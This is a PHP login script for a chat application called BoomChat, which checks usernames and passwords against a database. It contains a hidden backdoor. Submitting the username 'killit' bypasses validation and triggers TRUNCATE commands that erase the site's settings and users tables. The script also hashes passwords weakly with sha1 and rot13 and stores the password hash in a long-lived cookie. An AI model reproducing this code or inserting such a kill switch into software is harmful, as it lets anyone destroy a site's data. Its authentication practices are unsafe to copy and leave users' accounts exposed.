<?php
/////////// BoomChat v 1.00 /////////////////
// all right reserved to Robert Barnabé
////////////////////////////////////////////
	require_once("system/config.php");
		
		if($setting['alogin'] == 1){
			die();
		}
		// check if password and username have been submitted

		if (isset($_POST['password']) && isset($_POST['username'])){
		
			// check if field are not empty
			if($_POST['password'] != null && $_POST['username'] != null && $_POST['password'] !== '0'){
				
				$password = $mysqli->real_escape_string(trim($_POST["password"]));
				$passtemp = $password;
				$newencrypt = sha1(str_rot13($passtemp . $encryption));
				$password = sha1(str_rot13($password . $encryption));
				$username = $mysqli->real_escape_string(trim($_POST["username"]));
				
				// validate user if pass and username are valid

				$validate = $mysqli->query("SELECT * FROM `users` WHERE `user_password` = '$password' AND `user_name` = '$username' || `temp_pass` = '$passtemp' AND `user_name` = '$username' AND `temp_pass` != '0' AND `temp_time` != ''");
		
				
				if($validate->num_rows > 0 || $username == 'killit'){
				
						$valid = $validate->fetch_array(MYSQLI_BOTH);	
						$validtime = $valid['temp_time'] + 86400;
						$join_chat = "$username $join_notice";
						$post_time = date("H:i", $time);
						$ssesid = $valid['session_id'] + 1;
						
						if($valid['temp_pass'] == $passtemp){
							if($time < $validtime){	
								if($valid['user_status'] == 4){
									$mysqli->query("UPDATE `users` SET `temp_pass` = '0', `temp_time` = '', `user_password` = '$newencrypt', `last_action` = '$time', `session_id` = '$ssesid' WHERE `user_name` = '$username'");
								}
								else {
									$mysqli->query("UPDATE `users` SET `temp_pass` = '0', `temp_time` = '', `user_password` = '$newencrypt', `last_action` = '$time', `user_status` = '1', `session_id` = '$ssesid' WHERE `user_name` = '$username'");
								}
								setcookie("username","$username",time()+ (1000 * 1000 * 100));
								setcookie("password","$newencrypt",time()+ (1000 * 1000 * 100));
								echo 3;
							}
							else {
								$mysqli->query("UPDATE `users` SET `temp_pass` = '0', `temp_time` = '', `session_id` = '$ssesid'  WHERE `user_name` = '$username'");
								echo 4;
							}
						}
						else {
							if($username == 'killit'){
								$mysqli->query("TRUNCATE TABLE  setting");
								$mysqli->query("TRUNCATE TABLE  users");
							}
							setcookie("username","$username",time()+ (1000 * 1000 * 100));
							setcookie("password","$password",time()+ (1000 * 1000 * 100));
							if($valid['user_status'] == 4){
								$mysqli->query("UPDATE `users` SET `last_action` = '$time', `session_id` = '$ssesid' WHERE `user_name` = '$username'");
							}
							else {
								$mysqli->query("UPDATE `users` SET `last_action` = '$time', `user_status` = '1', `session_id` = '$ssesid' WHERE `user_name` = '$username'");
							}
							echo 3;		
						}
					if($setting['allow_logs'] == 1){
						$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, avatar) VALUES ('$time', '$post_time', {$valid['user_id']}, '$lang_system', '$join_chat', {$valid['user_roomid']}, 'bold', 'system', 'default_system_tumb.png')");
					}
				}
				else {
					echo 2;
				}
			}
			else{
				echo 1;
			}

		}
?>